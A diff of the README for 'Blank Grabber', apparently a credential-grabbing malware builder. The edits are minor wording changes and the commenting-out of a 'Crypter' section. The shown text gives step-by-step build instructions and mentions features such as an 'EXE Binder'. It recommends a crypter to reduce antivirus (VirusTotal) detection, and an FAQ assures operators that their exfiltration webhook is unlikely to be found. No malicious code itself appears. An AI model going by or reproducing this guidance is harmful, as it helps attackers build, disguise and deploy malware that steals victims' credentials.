@@ -24,8 +24,7 @@
 - [Builder Config](#builder-config)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
-- [To-Do/Enhancements](#to-doenhancements)
-- [Crypter](#crypter)
+- [To-Do/Enhancements](#to-doenhancements)	<!-- - [Crypter](#crypter)-->
 - [Frequently Asked Questions](#frequently-asked-questions)
 
 ## Download
@@ -81,7 +80,7 @@
 ## How to Build?
 *If you literally have no idea how to build it.*
 
-1. Download and install [Python3](https://www.python.org/downloads/). (Make sure to enable the *Add to PATH* option.)
+1. Download and install [Python3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
 3. [Download Blank Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
@@ -96,11 +95,11 @@
 - [x] Message Box.
 - [x] EXE Binder.
 
-## Crypter
+<!--## Crypter
    Use Blankrypt to reduce VirusTotal detection.
 
    [![Blankrypt](https://img.shields.io/badge/Crypt-it-green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blankrypt)
-
+-->
 ## Frequently Asked Questions
 - [What is the stub size after building?](#what-is-the-stub-size-after-building)
 - [Can my webhook get leaked?](#can-my-webhook-get-leaked)
@@ -112,8 +111,8 @@ The size of the stub depends on your system. For most of the systems, its < 8mb.
 
 #### Can my webhook get leaked?
 
-There is a very low chance that your webhook is going to be found.
+It is unlikely that your webhook is going to be found.
 
 #### How can I contact you?
 
-You can contact me via [Discord](https://discordlookup.com/user/904682505104396329).
+You can contact me via [Discord](https://discordlookup.com/user/904682505104396329) (Only contact me if you need to ask something).
